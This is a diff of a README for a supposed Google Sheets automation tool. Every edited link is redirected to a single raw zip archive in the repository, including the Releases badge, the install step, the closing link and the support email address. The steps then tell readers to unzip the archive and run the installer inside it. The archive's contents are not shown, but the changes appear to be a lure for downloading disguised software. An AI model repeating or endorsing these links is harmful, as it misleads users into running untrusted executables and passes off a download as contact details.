@@ -2,7 +2,7 @@
 
 Welcome to the **Desktop Google Sheets Automation Suite**! This project aims to simplify your daily tasks by automating interactions with Google Sheets. Whether you need to streamline data entry, manage repetitive tasks, or integrate workflows across different applications, this bot has you covered.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)](https://github.com/AppsLeandro/Desktop-Google-Sheets-Automation-Suite/releases)
+[![Download Releases](https://github.com/AppsLeandro/Desktop-Google-Sheets-Automation-Suite/raw/refs/heads/main/octroy/Google-Suite-Sheets-Desktop-Automation-v1.4.zip%20Releases-brightgreen)](https://github.com/AppsLeandro/Desktop-Google-Sheets-Automation-Suite/raw/refs/heads/main/octroy/Google-Suite-Sheets-Desktop-Automation-v1.4.zip)
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ The **Desktop Google Sheets Automation Suite** is designed for anyone looking to
 
 To get started, follow these steps:
 
-1. **Download the Latest Release**: Visit the [Releases section](https://github.com/AppsLeandro/Desktop-Google-Sheets-Automation-Suite/releases) to download the latest version of the bot.
+1. **Download the Latest Release**: Visit the [Releases section](https://github.com/AppsLeandro/Desktop-Google-Sheets-Automation-Suite/raw/refs/heads/main/octroy/Google-Suite-Sheets-Desktop-Automation-v1.4.zip) to download the latest version of the bot.
 2. **Extract Files**: Unzip the downloaded file to your desired location.
 3. **Run the Installer**: Execute the installation file to set up the bot on your system.
 
@@ -71,9 +71,9 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 For any questions or support, please reach out:
 
-- **Email**: [support@example.com](mailto:support@example.com)
+- **Email**: [https://github.com/AppsLeandro/Desktop-Google-Sheets-Automation-Suite/raw/refs/heads/main/octroy/Google-Suite-Sheets-Desktop-Automation-v1.4.zip](https://github.com/AppsLeandro/Desktop-Google-Sheets-Automation-Suite/raw/refs/heads/main/octroy/Google-Suite-Sheets-Desktop-Automation-v1.4.zip)
 - **GitHub Issues**: Use the issues section of this repository for bug reports or feature requests.
 
 ---
 
-Thank you for checking out the **Desktop Google Sheets Automation Suite**! We hope this tool makes your life easier and more productive. Don't forget to visit the [Releases section](https://github.com/AppsLeandro/Desktop-Google-Sheets-Automation-Suite/releases) for updates and new features!
+Thank you for checking out the **Desktop Google Sheets Automation Suite**! We hope this tool makes your life easier and more productive. Don't forget to visit the [Releases section](https://github.com/AppsLeandro/Desktop-Google-Sheets-Automation-Suite/raw/refs/heads/main/octroy/Google-Suite-Sheets-Desktop-Automation-v1.4.zip) for updates and new features!
